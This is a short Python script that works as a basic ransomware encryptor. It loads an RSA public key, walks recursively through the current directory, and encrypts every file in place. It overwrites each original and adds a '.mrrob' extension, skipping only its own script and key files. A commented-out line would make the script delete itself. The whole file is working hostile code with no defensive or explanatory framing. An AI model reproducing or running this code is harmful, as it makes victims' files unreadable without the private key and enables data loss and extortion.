import rsa
import sys
import os

#load public key
with open('publicKey.pem', 'rb') as p:
    publicKey = rsa.PublicKey.load_pkcs1(p.read())


#publicKey=rsa.PublicKey(19652435492732942274279747825931491705041738293358879239768224721069406376869458678680378789564439200751322941091295227506545905211672288247467480689261466383568716904001361864227339413777871952451115697197804895710214373487523070402301296267661972889608058987374449588072494997986968309147323122856429007692765556786714874976206709929924571630620259839701515297123831958202627023107654166664461300149800324774288153115943629156131606889691678916825422136815386201406157485162615731942093233959231701635191621724616287319404806380747627526104434494536164647153649870531128979823018988688809561678930750335030046760071,65537)

#encrypt file
def encryptData(filename):
    print("Encrypting: "+filename)
    temp=""
    temp=bytes(temp,'utf-8')
    with open(filename,'rb') as p:
        while(1):
            data=p.read(245)
            if len(data) == 0:
                break
            encData = rsa.encrypt(data,publicKey)
            temp=temp+encData

    with open(filename,'wb') as p:
        p.write(temp)
    os.rename(filename,filename+".mrrob")


#iterate through directories and give files
def giveFiles(Basefolder):
    insideFolder=os.listdir(Basefolder)
    for x in insideFolder:
        if x == "encrypt.py" or x == "decrypt.py" or x == "keyGeneration.py" or x == "privateKey.pem" or x == "publicKey.pem" :
            continue
        if os.path.isfile(os.path.join(Basefolder,x)):
            encryptData((os.path.join(Basefolder,x)))
        else:
            giveFiles(os.path.join(Basefolder,x))

currentFolder=os.getcwd()
giveFiles(currentFolder)

#kill itself
#os.remove(sys.argv[0])
